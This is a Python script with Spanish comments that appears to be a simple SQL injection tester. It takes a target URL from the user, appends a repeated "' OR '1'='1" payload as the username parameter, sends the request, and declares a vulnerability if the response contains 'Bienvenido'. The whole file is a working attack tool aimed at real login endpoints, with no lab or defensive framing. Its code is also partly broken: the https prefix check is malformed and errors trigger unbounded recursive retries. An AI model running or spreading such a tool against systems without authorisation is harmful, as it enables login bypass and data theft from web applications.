import os
import urllib.parse
import requests
from colorama import *

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def sql_injection_main():
    try:
        target_url = input("Ingrese la URL objetivo: ")
        if not target_url.startswith("http://") and not target_url.startswith("https:// \n"):
            raise ValueError("La URL debe comenzar con 'http://' o 'https://'")

        num_injections = int(input("Ingrese el número de inyecciones de SQL que desea generar: "))

        if num_injections <= 0:
            raise ValueError("El número de inyecciones debe ser un entero positivo.")

        payload = "' OR '1'='1 " * num_injections

        # Codificar el payload para que sea seguro enviarlo en la URL
        encoded_payload = urllib.parse.quote(payload, safe='')

        # Construir la URL con el payload inyectado
        url = f"{target_url}?username={encoded_payload}&password=test"

        # Realizar la solicitud HTTP GET
        response = requests.get(url)

        # Analizar la respuesta y determinar si la inyección fue exitosa
        if "Bienvenido" in response.text:
            print(Fore.BLACK + Back.GREEN + "Inyección de SQL exitosa. Se encontró una vulnerabilidad.")
        else:
            print(Fore.BLACK + Back.RED + "No se encontraron indicios de inyección de SQL en la respuesta.")

    except ValueError as ve:
        print(Fore.BLACK + Back.RED +"Error:", ve)
        print(Fore.BLACK + Back.RED +"Inserte datos válidos.")
        sql_injection_main()  # Volver a ejecutar la función

    except Exception as e:
        clear_screen()
        print(Fore.BLACK + Back.RED +"Error:", e)
        sql_injection_main()  # Volver a ejecutar la función

def banner():
    cartel = r"""
      ___  ___  _      ___        _       _   _         
     / __|/ _ \| |    |_ _|_ _   (_)_____| |_(_)___ _ _   
     \__ \ (_) | |__   | || ' \ / / -_) _|  _| / _ \ ' \ 
     |___/\__\_\____| |___|_||_| /\___\__|\__|_\___/_||_|
                            __/ /
                           |___/                    
    """
    print(Fore.CYAN + Style.BRIGHT + cartel + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + "*********************************************************" + Style.RESET_ALL)

if __name__ == "__main__":
    init(autoreset=True)  # Esto asegura que los colores se reseteen después de cada print
    banner()
    sql_injection_main()
